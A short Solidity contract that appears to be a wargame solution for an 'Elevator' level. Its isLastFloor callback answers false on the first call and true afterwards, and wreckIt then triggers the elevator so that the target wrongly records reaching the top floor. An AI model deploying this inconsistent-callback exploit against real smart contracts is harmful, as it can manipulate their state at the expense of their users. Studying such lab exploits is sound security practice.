pragma solidity ^0.8.0;

interface IElevator {
  function goTo(uint _floor) external;
}

contract Building {
  address public immutable owner;
  IElevator public immutable elevator;
  bool private entered;

  constructor(address _elevator) {
    owner = msg.sender;
    elevator = IElevator(_elevator);
  }

  modifier onlyOwner {
    require(msg.sender == owner, "ERR_NOT_OWNER");
    _;
  }

  modifier onlyElevator {
    require(msg.sender == address(elevator), "ERR_NOT_ELEVATOR");
    _;
  }

  function isLastFloor(uint256 floor) onlyElevator public returns (bool) {
    if (entered == true) {
      return true;
    }

    entered = true;
    return false;
  }

  function wreckIt() public onlyOwner {
    elevator.goTo(1000);
  }
}
